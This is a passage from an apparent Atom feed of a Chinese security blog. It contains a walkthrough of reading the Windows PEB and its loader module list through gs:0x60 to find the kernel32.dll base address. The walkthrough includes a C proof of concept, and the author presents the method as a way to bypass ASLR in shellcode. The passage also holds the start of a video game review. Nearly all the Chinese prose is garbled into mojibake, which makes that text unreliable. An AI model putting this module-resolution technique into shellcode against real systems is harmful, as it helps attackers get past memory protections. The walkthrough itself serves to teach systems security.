    <category term="Reverse" scheme="https://blog.beacox.space/tags/Reverse/"/>
    
    <category term="Web" scheme="https://blog.beacox.space/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Windows PEB åˆ©ç”¨</title>
    <link href="https://blog.beacox.space/posts/windows-peb-walkthrough/"/>
    <id>https://blog.beacox.space/posts/windows-peb-walkthrough/</id>
    <published>2024-03-16T12:00:00.000Z</published>
    <updated>2024-03-16T12:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLRï¼Œå…¨ç§° Address space layout randomizationï¼Œå³åœ°å€ç©ºé—´é…ç½®éšæœºåŠ è½½ã€‚å¤šæ•°ç°ä»£çš„åº”ç”¨ç¨‹åºéƒ½ä¼šå¼€å¯ ASLRã€‚ç›®çš„æ˜¯é˜²æ­¢æ”»å‡»è€…äº‹å…ˆè·çŸ¥ç¨‹åºçš„è™šæ‹Ÿå†…å­˜åœ°å€ï¼Œé˜²æ­¢æ”»å‡»è€…èƒ½å¯é åœ°è·³è½¬åˆ°å†…å­˜çš„ç‰¹å®šä½ç½®æ¥åˆ©ç”¨å‡½æ•°ã€‚</p><p>åœ¨Linuxä¸­ï¼ŒASLR çš„å®ç°æ–¹å¼æ˜¯åŒä¸€ä¸ªåº”ç”¨ç¨‹åºæ¯æ¬¡å¯åŠ¨éƒ½ä¼šè¢«åŠ è½½åˆ°ä¸åŒçš„ä½ç½®ã€‚è€Œåœ¨ Windows ä¸­ï¼Œåªèƒ½ä¿è¯ç³»ç»Ÿé‡å¯ååœ°å€çš„éšæœºæ€§ã€‚</p><p>ç©¶å…¶åŸå› ï¼Œæ˜¯å¯¹æ€§èƒ½å’Œå®‰å…¨æ€§æƒè¡¡åçš„ç»“æœã€‚ç”±äº Windows ä¸é‡‡ç”¨ PIEï¼Œå› æ­¤å…¶ ASLR çš„å®ç°éœ€è¦ä»˜å‡ºå†…å­˜ä»£ä»·ã€‚ æ¯æ¬¡å°†åº“æ˜ å°„åˆ°ä¸åŒåœ°å€æ—¶ï¼Œéƒ½ä¼šå ç”¨æ›´å¤šå†…å­˜ã€‚</p><p>å½“ç„¶è¿™ä¹Ÿæ„å‘³ç€ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æŸå° Windows æœºå™¨ä¸Šè·å–äº†ä¸€æ¬¡åº“å‡½æ•°çš„è™šæ‹Ÿåœ°å€ï¼Œåœ¨å…¶é‡å¯ä¹‹å‰ï¼Œæˆ‘ä»¬éƒ½èƒ½å¤Ÿç»§ç»­ä½¿ç”¨ã€‚</p><h2 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h2><p>åœ¨ Linux ä¸­ï¼Œå†…æ ¸é€šè¿‡<code>task_struct</code>ä¿å­˜å¹¶ç®¡ç†è¿›ç¨‹ç›¸å…³çš„ä¿¡æ¯ï¼Œåœ¨ Windows ä¸­èµ·åˆ°ç±»ä¼¼ä½œç”¨çš„æ˜¯PEBã€‚å½“ç„¶ï¼Œè¿˜æ˜¯æœ‰è®¸å¤šä¸åŒä¹‹å¤„ã€‚ä¾‹å¦‚ PEB åœ¨ç”¨æˆ·æ€ä¸­è€Œ <code>task_struct</code>åœ¨å†…æ ¸æ€ä¸­ã€‚</p><blockquote><p><strong>è¿›ç¨‹ç¯å¢ƒå—</strong>ï¼ˆ<strong>PEB</strong>ï¼‰æ˜¯ <a href="https://zh.wikipedia.org/wiki/Windows_NT">Windows NT</a><a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">æ“ä½œç³»ç»Ÿ</a>å†…éƒ¨ä½¿ç”¨çš„æ•°æ®ç»“æ„ï¼Œç”¨ä»¥å­˜å‚¨æ¯ä¸ªè¿›ç¨‹çš„è¿è¡Œæ—¶æ•°æ®ã€‚</p></blockquote><p>ç»´åŸºç™¾ç§‘å¯¹ PEB çš„æè¿°è¶³å¤Ÿå…¨é¢ï¼Œæ¨èæ„Ÿå…´è¶£çš„è¯»è€…ç»§ç»­é˜…è¯»ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ä¸­æ–‡ç¿»è¯‘æœ‰äº›ç‘•ç–µã€‚è¯´å›åˆ° PEBï¼ŒPEB æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼ŒåŒ…å«äº†è¿›ç¨‹æ˜¯å¦è¢«è°ƒè¯•ã€è¢«åŠ è½½æ¨¡å—çš„è™šæ‹Ÿåœ°å€ç­‰å¤§é‡ä¿¡æ¯ã€‚</p><p>åœ¨ Windows 11 23H2 (2023 Update) ç‰ˆæœ¬çš„å†…æ ¸ä¸­ï¼ŒPEB çš„éƒ¨åˆ†å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x7d0 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    UCHAR InheritedAddressSpace;                                            <span class="comment">//0x0</span></span><br><span class="line">    UCHAR ReadImageFileExecOptions;                                         <span class="comment">//0x1</span></span><br><span class="line">    UCHAR BeingDebugged;                                                    <span class="comment">//0x2</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    {</span></span><br><span class="line">        UCHAR BitField;                                                     <span class="comment">//0x3</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        {</span></span><br><span class="line">            UCHAR ImageUsesLargePages:<span class="number">1</span>;                                    <span class="comment">//0x3</span></span><br><span class="line">            UCHAR IsProtectedProcess:<span class="number">1</span>;                                     <span class="comment">//0x3</span></span><br><span class="line">            UCHAR IsImageDynamicallyRelocated:<span class="number">1</span>;                            <span class="comment">//0x3</span></span><br><span class="line">            UCHAR SkipPatchingUser32Forwarders:<span class="number">1</span>;                           <span class="comment">//0x3</span></span><br><span class="line">            UCHAR IsPackagedProcess:<span class="number">1</span>;                                      <span class="comment">//0x3</span></span><br><span class="line">            UCHAR IsAppContainer:<span class="number">1</span>;                                         <span class="comment">//0x3</span></span><br><span class="line">            UCHAR IsProtectedProcessLight:<span class="number">1</span>;                                <span class="comment">//0x3</span></span><br><span class="line">            UCHAR IsLongPathAwareProcess:<span class="number">1</span>;                                 <span class="comment">//0x3</span></span><br><span class="line">        };</span><br><span class="line">    };</span><br><span class="line">    UCHAR Padding0[<span class="number">4</span>];                                                      <span class="comment">//0x4</span></span><br><span class="line">    VOID* Mutant;                                                           <span class="comment">//0x8</span></span><br><span class="line">    VOID* ImageBaseAddress;                                                 <span class="comment">//0x10</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span>* <span class="title">Ldr</span>;</span>                                              <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_USER_PROCESS_PARAMETERS</span>* <span class="title">ProcessParameters</span>;</span>                 <span class="comment">//0x20</span></span><br><span class="line">    VOID* SubSystemData;                                                    <span class="comment">//0x28</span></span><br><span class="line">    VOID* ProcessHeap;                                                      <span class="comment">//0x30</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span>* <span class="title">FastPebLock</span>;</span>                              <span class="comment">//0x38</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">SLIST_HEADER</span>* <span class="title">volatile</span> <span class="title">AtlThunkSListPtr</span>;</span>                         <span class="comment">//0x40</span></span><br><span class="line">    VOID* IFEOKey;                                                          <span class="comment">//0x48</span></span><br><span class="line">â€¦â€¦</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨åç§»ä¸º 0x18 çš„ <strong>Ldr</strong> å­—æ®µã€‚ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºå®ƒåŒ…å«äº†è¢«åŠ è½½æ¨¡å—ï¼ˆç”¨åˆ°çš„åº“ï¼‰çš„è™šæ‹Ÿåœ°å€ã€‚</p><h2 id="Ldr-æ¦‚è§ˆ"><a href="#Ldr-æ¦‚è§ˆ" class="headerlink" title="Ldr æ¦‚è§ˆ"></a>Ldr æ¦‚è§ˆ</h2><p>åœ¨åˆ©ç”¨ä¹‹å‰ï¼Œæˆ–è®¸åº”è¯¥å…ˆçœ‹çœ‹è¿™ä¸ªå­—æ®µåŒ…å«ä»€ä¹ˆå†…å®¹ã€‚æˆ‘å…ˆåœ¨ Windbg ä¸­éšæœºæ‰“å¼€ä¸€ä¸ªåº”ç”¨ç¨‹åºçœ‹çœ‹ PEB åŠ Ldr çš„å†…å®¹ã€‚</p><p><img src="https://bu.dusays.com/2024/03/16/65f56cd47e02d.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/03/16/65f56cd47e02d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="lm"></p><p>åœ¨å‘½ä»¤æ¡†ä¸­é”®å…¥<code>lm</code>ï¼Œå³ list modulesï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªåº”ç”¨åŠ è½½äº†5ä¸ªæ¨¡å—ã€‚å…¶ä¸­<code>a</code>æ˜¯ç¨‹åºæœ¬èº«çš„åå­—ï¼ˆa.exeï¼‰ï¼Œè€Œ<code>KERNEL32</code>æ˜¯æˆ‘ä»¬å…³å¿ƒçš„å¦ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºå®ƒæ§åˆ¶ç€ç³»ç»Ÿçš„å†…å­˜ç®¡ç†ã€æ•°æ®çš„è¾“å…¥è¾“å‡ºæ“ä½œå’Œä¸­æ–­å¤„ç†ï¼Œæˆ–è€…æ¢å¥è¯è¯´ï¼Œå…¶ä¸­æœ‰è®¸å¤šæˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼ˆå¦‚<code>WriteFile()</code>ç”¨æ¥å†™ï¼‰ã€‚åœ¨ä¸ä½¿ç”¨è°ƒè¯•å·¥å…·çš„æ—¶å€™æˆ‘ä»¬æ— æ³•å¦‚æ­¤ä¾¿æ·åœ°è·å–è¢«åŠ è½½æ¨¡å—çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç”¨åˆ° PEBã€‚</p><p>åœ¨ Windbg ä¸­ä¹Ÿå¯ä»¥å¾ˆæ–¹ä¾¿åœ°æŸ¥çœ‹ PEB ä¿¡æ¯ï¼š</p><p><img src="https://bu.dusays.com/2024/03/16/65f56e437cd9e.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/03/16/65f56e437cd9e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="!peb"></p><p>åœ¨å‘½ä»¤æ¡†ä¸­é”®å…¥<code>!peb</code>å¯ä»¥çœ‹åˆ° <code>Ldr.InMemoryOrderModuleList</code>ä¸‹å­˜å‚¨ç€è¢«åŠ è½½æ¨¡å—åœ°åŸºåœ°å€ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ˜¯æˆ‘ä»¬çš„ç›®æ ‡ï¼Œå…¶æ˜¾ç¤ºçš„åŸºåœ°å€å’Œä¹‹å‰ä½¿ç”¨<code>lm</code>å‘½ä»¤æŸ¥çœ‹åˆ°çš„åœ°å€æ˜¯ä¸€è‡´çš„ã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™äº› Modules æ­£æ˜¯ä»¥ List é“¾è¡¨å½¢å¼å­˜å‚¨çš„ã€‚æˆ‘ä»¬ç®€å•åœ°éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="https://bu.dusays.com/2024/03/16/65f57071c5d17.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/03/16/65f57071c5d17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="list"></p><p>ä¸éš¾å‘ç°ï¼Œåœ¨æ¯ä¸ªæ¡ç›®çš„å¼€å¤´å­˜å‚¨ç€ä¸‹ä¸€ä¸ªæ¡ç›®çš„åœ°å€ï¼Œè€Œåç§» 0x20 å¤„å­˜å‚¨ç€è¢«åŠ è½½æ¨¡å—çš„åŸºåœ°å€ã€‚å› æ­¤å½“æˆ‘ä»¬è¡¨å¤´çš„åœ°å€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ¯ä¸ªé“¾è¡¨é¡¹è·³è½¬åˆ°ä¸‹ä¸€ä¸ªé“¾è¡¨é¡¹ã€å¯ä»¥è·å–æ¯ä¸ªé“¾è¡¨é¡¹ä¸‹æ¨¡å—çš„åŸºåœ°å€ã€‚</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>æ¥ä¸‹æ¥å°±æ˜¯ç¼–å†™ C ä»£ç è·å–è¢«åŠ è½½æ¨¡å—è™šæ‹Ÿåœ°å€çš„ demo äº†ã€‚æˆ‘ä»¬å…ˆæå‡ºå°šæœªè§£å†³çš„å‡ ä¸ªé—®é¢˜ï¼š</p><ol><li>å¦‚ä½•è·å¾— PEB ç»“æ„ä½“åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Ÿ</li><li>Ldr ç›¸å¯¹ PEB çš„åç§»é‡å·²çŸ¥æ˜¯ 0x18ï¼ŒLdr.InMemoryOrderModuleList ç›¸å¯¹ Ldr çš„åç§»æ˜¯å¤šå°‘ï¼Ÿ</li></ol><p>å…ˆå›ç­”ç¬¬äºŒä¸ªé—®é¢˜ï¼šLdr.InMemoryOrderModuleList ç›¸å¯¹ Ldr çš„åç§»æ˜¯ 0x20 ã€‚å¹¶ä¸”åœ¨æˆ‘ä»¬ç¼–å†™ C ä»£ç çš„æ—¶å€™ï¼Œä¸éœ€è¦çŸ¥é“å…·ä½“çš„åç§»é‡ï¼Œåªéœ€è¦çŸ¥é“å­—æ®µåç§°å³å¯ï¼Œç›¸åº”çš„åº“ä¼šå¸®æˆ‘ä»¬å¤„ç†å¥½åç§»é‡ã€‚</p><p>æ¥ç€æ˜¯ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šWindows ç”¨ FS/GS å¯„å­˜å™¨æ¥å­˜å‚¨ PEB çš„åœ°å€ï¼Œåˆ†åˆ«å¯¹åº”32ä½/64ä½ã€‚å…·ä½“å¦‚ä¸‹ï¼š</p><ul><li>32ä½ï¼šfs:0x30</li><li>64ä½ï¼šgs:0x60</li></ul><p><code>:</code>åä»£è¡¨åç§»é‡ã€‚</p><p>è§£å†³äº†è¿™ä¸¤ä¸ªé—®é¢˜ä¹‹åå°±å¯ä»¥ç¼–å†™ C ä»£ç äº†ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">    <span class="comment">// __readgsqword(0x60) equals to mov &lt;register&gt;, gs:[0x60]</span></span><br><span class="line">    PPEB pebPtr = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">    PPEB_LDR_DATA ldrData = pebPtr-&gt;Ldr;</span><br><span class="line">    PLIST_ENTRY moduleList = &amp;ldrData-&gt;InMemoryOrderModuleList;</span><br><span class="line">    <span class="comment">// Get the first module in the list</span></span><br><span class="line">    PLDR_DATA_TABLE_ENTRY program_module = CONTAINING_RECORD(moduleList-&gt;Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Skip 3 modules to get kernel32.dll</span></span><br><span class="line">    moduleList = moduleList-&gt;Flink;</span><br><span class="line">    moduleList = moduleList-&gt;Flink;</span><br><span class="line">    moduleList = moduleList-&gt;Flink;</span><br><span class="line">    <span class="comment">// Get kernel32.dll</span></span><br><span class="line">    PLDR_DATA_TABLE_ENTRY kernel32_module = CONTAINING_RECORD(moduleList, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">    PVOID program_base = program_module-&gt;DllBase;</span><br><span class="line">    PVOID kernel32_base = kernel32_module-&gt;DllBase;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Program base: %p\n"</span>, program_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Kernel32 base: %p\n"</span>, kernel32_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>ç®€å•åœ°è§£é‡Šä¸€ä¸‹æµç¨‹ï¼š</p><ol><li>é€šè¿‡ <code>gs</code> å¯„å­˜å™¨è·å– <code>PEB</code> åœ°å€</li><li>é€šè¿‡ <code>PEB</code> ç»“æ„ä½“è·å– <code>Ldr</code></li><li>é€šè¿‡ <code>Ldr</code> è·å– <code>InMemoryOrderModuleList</code></li><li><code>Flink</code> ä¸€æ¬¡å°†å–å‡ºè¡¨å¤´ï¼Œåœ¨å›ºå®šçš„åç§»å¤„å¯ä»¥å–å‡ºç¨‹åºåŸºåœ°å€</li><li><code>Flink</code> 3æ¬¡å°†å–å‡ºç¬¬ä¸‰é¡¹ï¼Œåœ¨åŒæ ·çš„åç§»å¤„å¯ä»¥å–å‡º <code>Kernel32.dll</code> çš„åŸºåœ°å€</li></ol><p>ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶å¹¶è¿è¡Œï¼š</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc poc.c</span><br><span class="line">./a.exe</span><br></pre></td></tr></tbody></table></figure><p>å¾—åˆ°è¾“å‡ºï¼š</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Program base: <span class="number">0000000000400000</span></span><br><span class="line">Kernel32 base: <span class="number">00007</span>FFEBE4B0000</span><br></pre></td></tr></tbody></table></figure><p>å‘ç°ä¸åœ¨ Windbg ä¸­å¾—åˆ°çš„ä¸€è‡´ã€‚</p><p>è¿™è¯æ˜ï¼šæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–å†™ C ä»£ç è·å¾—è¢«åŠ è½½æ¨¡å—çš„åŸºåœ°å€ã€‚æ›´è¿›ä¸€æ­¥åœ°ï¼Œæˆ‘ä»¬çš„ C ä»£ç ç»è¿‡ç¼–è¯‘ååæ±‡ç¼–å¾—åˆ°çš„æ±‡ç¼–ä»£ç ç®€å•æ¸…æ™°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç¼–å†™æ¯”è¾ƒç®€å•çš„æ±‡ç¼–æ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚æ¢è¨€ä¹‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ shellcode ä¸­å®ç°è¿™ä¸€ç›®æ ‡ä»è€Œç»•è¿‡ ASLRã€‚</p>]]></content>
    
    
    <summary type="html">ä¸€ç¯‡ Windows PEB ç»“æ„ä½“åˆ©ç”¨çš„walkthroughã€‚</summary>
    
    
    
    <category term="ç³»ç»Ÿå®‰å…¨" scheme="https://blog.beacox.space/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Windows" scheme="https://blog.beacox.space/tags/Windows/"/>
    
    <category term="ASLR" scheme="https://blog.beacox.space/tags/ASLR/"/>
    
    <category term="shellcode" scheme="https://blog.beacox.space/tags/shellcode/"/>
    
    <category term="PoC" scheme="https://blog.beacox.space/tags/PoC/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šå±±æ²³æ—…æ¢ã€‹(Murders on the Yangtze River) é€šå…³ç®€è¯„</title>
    <link href="https://blog.beacox.space/posts/murders-on-the-yangtze-river/"/>
    <id>https://blog.beacox.space/posts/murders-on-the-yangtze-river/</id>
    <published>2024-02-16T12:32:00.000Z</published>
    <updated>2024-02-16T12:32:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ”¶åˆ°æœ‹å‹çš„å®‰åˆ©ï¼Œè¶ç€è¿‡å¹´æ‰“æŠ˜å…¥æ‰‹äº†ã€Šå±±æ²³æ—…æ¢ã€‹ã€‚å…¶å®æˆ‘æ­¤å‰å¾ˆå°‘ç©æ¨ç†æ¸¸æˆï¼Œå¯èƒ½æ˜¯å› ä¸ºä»¥å‰ç©å‰§æœ¬æ€æ—¶æˆ‘ä¹Ÿé²œæœ‰å‡†ç¡®çš„æ¨ç†ã€‚ä¸€å¼€å§‹å¸å¼•æˆ‘çš„ï¼Œæ˜¯ã€Šå±±æ²³æ—…æ¢ã€‹çš„æ°´å¢¨é£ä»¥åŠæ®è¯´ç²¾å½©çš„å‰§æƒ…ã€‚äº‹å®è¯æ˜ï¼Œã€Šå±±æ²³æ—…æ¢ã€‹ä¸åªæœ‰è¿™äº›ä¼˜ç‚¹ã€‚</p><h2 id="ç”»é£"><a href="#ç”»é£" class="headerlink" title="ç”»é£"></a>ç”»é£</h2><div class="tag-plugin swiper-container" width="max"><div class="swiper-wrapper"><div class="swiper-slide"><img no-lazy="" src="https://bu.dusays.com/2024/02/16/65cf5c075dc14.jpg"></div><div class="swiper-slide"><img no-lazy="" src="https://bu.dusays.com/2024/02/16/65cf5c8e54edf.jpg"></div><div class="swiper-slide"><img no-lazy="" src="https://bu.dusays.com/2024/02/16/65cf5d0761ba9.jpg"></div><div class="swiper-slide"><img no-lazy="" src="https://bu.dusays.com/2024/02/16/65cf5a45b21e5.jpg"></div><div class="swiper-slide"><img no-lazy="" src="https://bu.dusays.com/2024/02/16/65cf5d2ccdbaa.jpg"></div></div><div class="swiper-pagination"></div><div class="swiper-button-prev blur"></div><div class="swiper-button-next blur"></div></div><p>ã€Šå±±æ²³æ—…æ¢ã€‹æ˜¯ä¸€æ¬¾æ¨ªè½´çš„æ¨ç†æ¢æ¡ˆæ¸¸æˆï¼Œæ•…äº‹å‘ç”Ÿåœ¨æ¸…æœ«æ°‘åˆâ€”â€”æ­£æ˜¯ä¸­å›½å°å»ºä¸»ä¹‰ç¤¾ä¼šå—åˆ°åˆ°è¥¿æ–¹æ”¿æ²»æ–‡åŒ–å¼ºçƒˆå†²å‡»çš„å¹´ä»£ã€‚å› æ­¤æ¸¸æˆç”»é¢å³åŒ…å«ç”°é‡ä¹¡é—´ã€å®˜åºœè¡™é—¨ï¼Œä¹ŸåŒ…å«æ±‰é˜³é“å‚ã€è½®èˆ¹ã€ä¸Šæµ·è¡—å¤´ã€ä¼šå®¡å…¬å»¨ï¼ˆä¸­å›½è¿‘ä»£å²ä¸Šå¤–å›½ç§Ÿç•Œå†…çš„å¸æ³•å®¡åˆ¤æœºæ„ï¼Œåœ¨è¿™äº›æœºæ„å†…ç”±ç§Ÿç•Œå›½é¢†äº‹ä¸ä¸­å›½å®˜å‘˜å…±åŒå®¡ç†æ¡ˆä»¶ï¼‰ç­‰åœºæ™¯ï¼Œè·¨åº¦éå¸¸å¤§ã€‚æ¯”èµ·æŸäº›å›½äº§åŠ¨æ¼«ï¼ˆæ¯”å¦‚ã€Šé›¾å±±äº”è¡Œã€‹ï¼‰ï¼Œã€Šå±±æ²³æ—…æ¢ã€‹çš„æ°´å¢¨é£ä¸ç®—éœ‡æ’¼ï¼Œä½†æ˜¯åœºæ™¯çš„ç»†èŠ‚éƒ½åšå¾—ä¸é”™ã€‚</p><h2 id="å‰§æƒ…"><a href="#å‰§æƒ…" class="headerlink" title="å‰§æƒ…"></a>å‰§æƒ…</h2><p>æ¸¸æˆæ˜æš—çº¿äº¤ç»‡ï¼Œ6ä¸ªå‘ç”Ÿåœ¨ä¸åŒåœ°ç‚¹çš„æ¡ˆä»¶ä¸²è”èµ·æ¥çš„æ•…äº‹ï¼Œåœ¨æœ€åçš„ç»“å±€ä¸­æ±‡èšã€è¿¸å‘ã€‚è™½ç„¶ä»…ä»…10å°æ—¶å·¦å³çš„æ¸¸æˆæ—¶é•¿ï¼Œä½†æ˜¯å°†è®¸å¤šäººç‰©éƒ½åˆ»ç”»å¾—ç«‹ä½“é²œæ˜â€”â€”è‡ªç§çš„ã€ä¸ºç¥–å›½äº‹ä¸šå¥‹æ–—çš„ã€è¿·ä¿¡çš„ã€è¿›æ­¥çš„ã€å…¬æ­£çš„ã€ä¼ªå–„çš„â€¦â€¦æ¸¸æˆå¾ˆå¥½åœ°å°†æ•…äº‹èƒŒæ™¯èå…¥åˆ°äº†æ•…äº‹å’Œäººç‰©å½“ä¸­ï¼Œæ¯ä¸ªäººç‰©éƒ½æ˜¯é‚£ä¸ªå¹´ä»£æŸä¸€æ‰¹äººçš„ç¾¤åƒã€‚è€Œä»æ¡ˆæƒ…ä¸Šæ¥è®²ï¼Œä½œä¸ºä¸€ä¸ªæ¨ç†æ¸¸æˆï¼Œä½œæ¡ˆã€æ¢æ¡ˆçš„é€»è¾‘ç»å¾—èµ·æ¨æ•²ï¼Œéœ€è¦ç»†ç»†ç¢ç£¨ã€‚ä¸å°‘æ¡ˆä»¶ä¸­çš„ä½œæ¡ˆæ‰‹æ³•ä¹Ÿæ˜¯è®©æˆ‘è§‰å¾—è„‘æ´å¤§å¼€ã€‚</p><h2 id="ç©æ³•"><a href="#ç©æ³•" class="headerlink" title="ç©æ³•"></a>ç©æ³•</h2><p>ä¸€å¼€å§‹æˆ‘å·²ç»å‡†å¤‡å¥½å°†è¿™ä¸ªæ¸¸æˆå½“ä½œè§†è§‰å°è¯´å»ç©äº†ï¼Œä½†æ˜¯ä¸€ä¸Šæ‰‹æˆ‘å°±çŸ¥é“ä¸å¸¦è„‘å­ä¸è¡Œäº†ã€‚æ¸¸æˆçš„ç©æ³•æ¯”è¾ƒä¸°å¯Œï¼šä½œæ¡ˆå·¥å…·æŒ‡è®¤ã€è¯ç‰©æŒ‡è®¤ã€è¯äººæŒ‡è®¤ã€è¯è¨€ä¹‹é—´çš„çŸ›ç›¾æŒ‡è®¤ã€è¯è¨€ä¸è¯ç‰©ä¹‹é—´çš„çŸ›ç›¾æŒ‡è®¤ã€å°¸ä½“å‹˜å¯Ÿã€ç°åœºå‹˜å¯Ÿç­‰ï¼Œè¿˜åŸäº†å®é™…æ¢æ¡ˆçš„å¤§å¤šæ•°æµç¨‹ï¼Œååˆ†æœ‰ä»£å…¥æ„Ÿã€‚éš¾åº¦ä¸Šï¼Œæœ‰ä¸ªåˆ«åœºæ™¯çš„æ¨ç†æ¯”è¾ƒéš¾ï¼Œä½†å¤§å¤šæ•°æ—¶é—´é‡Œæˆ‘éƒ½èƒ½åšå‡ºæ­£ç¡®çš„æ¨ç†ã€‚æ¸¸æˆä¸­ä¹Ÿæœ‰ä¸€äº›ç®€å•çš„å°æ¸¸æˆç”¨äºè°ƒæ•´èŠ‚å¥ã€‚ç”±äºä¹‹å‰æ²¡æœ‰ç©è¿‡ç›¸åŒç±»å‹çš„æ¨ç†æ¸¸æˆï¼Œå› æ­¤ç©æ³•å¯¹äºæˆ‘æ¥è¯´è¶³å¤Ÿæ–°é²œä¹Ÿè¶³å¤Ÿä¸°å¯Œã€‚</p><h2 id="é…éŸ³-x2F-é…ä¹"><a href="#é…éŸ³-x2F-é…ä¹" class="headerlink" 